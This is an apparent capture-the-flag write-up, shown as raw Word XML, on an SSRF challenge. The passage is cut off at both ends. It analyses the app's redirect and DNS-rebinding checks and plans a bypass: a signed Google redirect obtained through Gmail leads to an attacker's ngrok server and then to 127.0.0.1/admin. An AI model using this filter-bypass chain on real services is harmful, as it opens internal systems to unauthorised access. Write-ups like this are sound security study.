          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(1) # 1 second wait</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598EEAB6" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Four</w:t>
      </w:r>
      <w:r>
        <w:t>th observation: The application performs DNS rebinding protection by resolving the hostname twice with a 1-second interval and checks if the resolved IP is private.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACF35A9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">response = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>requests.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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allow_redirects</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=False) # Send request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">if 300 &lt;= </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>response.statu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>s_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>response.status_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;= 309:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>redirect_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>response.headers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>['location']</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    # ... check redirect URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>check_ssrf</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redirect_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>, checked + 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4A83A9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Fifth observation: The application follows redirects manually, checking each redirect destination</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A9E07A" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>But most importantly, let's look at how the final request is made:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B15B2B6" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"># In </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>check_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> function:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">response = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>requests.get</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url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A75DCD7" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">Final critical observation: While the security checks disable automatic redirects with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>allow_redirects</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=False</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the final request does </w:t>
      </w:r>
      <w:r>
        <w:t>follow redirects automatically!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A5ED16" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>4. Attack Surface Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16853BB0" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Based on our code analysis, we need to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104F887C" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Start with a URL from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>www.google.com</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that redirects to our controlled server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5633C3B4" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Bypass the DNS rebinding protection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE7B53F" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Eventually redirect to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>http://127.0.0.1/admin?nickname=something</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4620F818" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Retrieve the flag using the same nickname</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DA921F" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Search</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5124B48F" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>1. Google URL Redirect Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082FB130" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>To understand Google's redirect mechanism, let's first look at how it normally works when searching:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AD2CBF" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you </w:t>
      </w:r>
      <w:r>
        <w:t>perform a Google search, each result link doesn't point directly to the destination</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169A589B" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Instead, it points to Google's redirect service: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>https://www.google.com/url?...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A45F525" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>This service records analytics data and then redirects you to the actual destination</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DA672E" w14:textId="3B3B5DE2" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>For example, when searching for "</w:t>
      </w:r>
      <w:r w:rsidR="00406513">
        <w:t>LOL</w:t>
      </w:r>
      <w:r>
        <w:t>" and right-clicking on a search result to copy the link, you get something like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB52846" w14:textId="1D10E87E" w:rsidR="00EC35E6" w:rsidRDefault="00406513">
      <w:r w:rsidRPr="00406513">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6CC56C65" wp14:editId="0C5B13BD">
            <wp:extent cx="5943600" cy="2355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5850"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D6FA19" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00EC35E6"/>
    <w:p w14:paraId="17453D71" w14:textId="79F1CEEE" w:rsidR="00EC35E6" w:rsidRDefault="00406513">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406513">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>https://www.google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://www.leagueoflegends.com/&amp;ved=2ahUKEwj3587X386OAxVvRaQEHQsGJX8QFnoECCwQAQ&amp;usg=AOvVaw1DQWKlmfzXqO7OW2E2rbiF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5652DFE8" w14:textId="2E861FF0" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>When you visit this URL, Google immediately redirects you to `</w:t>
      </w:r>
      <w:r w:rsidRPr="00730AB9">
        <w:t>https://www.leagueoflegends.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> without showing any warning page. Thi</w:t>
      </w:r>
      <w:r>
        <w:t>s is the default behavior for legitimate search result links.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4464A88A" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">However, if you manually modify the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter to point to a different site, Google will show a warning page instead of redirecting directly:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A28721" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:color w:val="404040"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId9">
        <w:r>
          <w:rPr>
            <w:i/>
            <w:color w:val="404040"/>
          </w:rPr>
          <w:t>https://www.google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://example.com/&amp;ved=2ahUKEwjZkcPwrOeNAxWoxQIHH</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:i/>
            <w:color w:val="404040"/>
          </w:rPr>
          <w:t>XtkIRkQFnoECDgQAQ&amp;usg=AOvVaw1ZdjnOEOwQMqBbQma6rz2M</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="404040"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A26E464" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6283924B" wp14:editId="6C903743">
            <wp:extent cx="5943600" cy="178371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783715"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">This difference in behavior is because Google uses the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>usg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter as a cryptographic signature to verify that the URL hasn't been tampered with.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51149D47" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2. Obtaining Valid Google Redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE29B8A" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>After research, I fo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">und an article on </w:t>
      </w:r>
      <w:hyperlink r:id="rId11">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>privacy-wise.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> explaining how Google's redirect mechanism works. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>usg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter is a cryptographic signature that Google uses to validate the URL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7675C270" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">Normally </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>usg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>exist only for links that is indexed but we can obtain one even if our website is not indexed.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>usg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is not documented or known it’s algorithm so we need to find a way to make google create one for our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB14391" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">To obtain a valid </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>usg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter for our controlled domain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1179D557" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Send an email from one Gmail account to another containing our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">( </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> will be used to do port forwarding to our webserver that will later exploit the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ssrf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FA1EE9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Open the email in the recipient account</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B807BE0" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Intercept the request when clicking the link</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1D3928" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Extr</w:t>
